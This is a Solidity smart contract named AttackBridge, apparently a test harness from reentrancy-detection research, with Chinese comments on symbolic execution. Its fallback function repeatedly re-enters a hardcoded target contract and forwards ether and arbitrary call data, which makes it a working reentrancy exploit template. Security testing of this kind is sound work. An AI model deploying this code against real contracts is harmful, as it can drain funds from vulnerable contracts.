// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackBridge{
    uint private counter;
    // address private last_caller_addr;
    string private func_sig;
    bytes private call_data_list;
    // string private func_sig_re;
    // address private owner;
    uint private flag;


    constructor(string memory func_sig_) public {
        counter = 0;
        // last_caller_addr = address(0);
        // func_sig_re = func_sig_;
        // owner = msg.sender;
    }
    
    // function set_func_sig(string memory func_sig_) public {
    //     func_sig = func_sig_;
    // }
    // function set_call_addr(address addr_) public {
    //     victim_addr = addr_;
    // }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 
   
    function attack1(uint num_, string memory func_sig_,  bytes memory call_data_1) public payable{
        //string n = "transfer(address)";
        func_sig = func_sig_;
        call_data_list = call_data_1;

        // 开锁
        flag = 1;

        (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call{value: num_}(
            abi.encodeWithSignature(func_sig_, call_data_1,call_data_1) );
        if (!sucess){
            //关锁
            revert();
        }
        //关锁
        flag = 0;
    }
    function attack0(uint num_, string memory func_sig_) public payable{
        //string n = "transfer(address)";
        func_sig = func_sig_;
 
        // 开锁
        flag = 1;

        (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call{value: num_}(
            abi.encodeWithSignature(func_sig_) );
        if (!sucess){
            //关锁
            revert();
        }
        //关锁
        flag = 0;
    }
    function call_ (address addr_, string memory sig) private returns (bool){
        bool sucess;
        bytes memory data;
        if (call_data_list.length == 0){
            (sucess, data) = address(addr_).call(
            abi.encodeWithSignature(sig) );
            return sucess;
        }
        else {
            (sucess, data) = address(addr_).call(
            // abi.encodeWithSignature(sig, call_data_list) );
            abi.encodeWithSignature(sig, call_data_list,call_data_list) );
            return sucess;
        }
    }

    fallback () external payable {
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        if (flag != 1){
            revert();
        }
        string memory sig = func_sig;
       
        
            // if(counter!=0){ 上面启用了的条件会导致 只找那些 循环调用同一个合约了的情况, 如果用 counter!=0 还会搜集 不同合约间引发的 reentrancy 情况 更复杂.
                // reentrancy call
        counter += 1;
        if (counter < 3){
                    // (bool sucess, bytes memory data) = address(msg.sender).call(
                    // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );
            bool sucess = call_ (address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F), sig);
            if (!sucess){
                revert();
            }
        }
        
        
        // 如果不是连续的同一个函数的调用 那么就结束吧
        
        // TX END, 这使得每次 执行 该函数 都会是新的状态值.
        counter = 0;
    }
}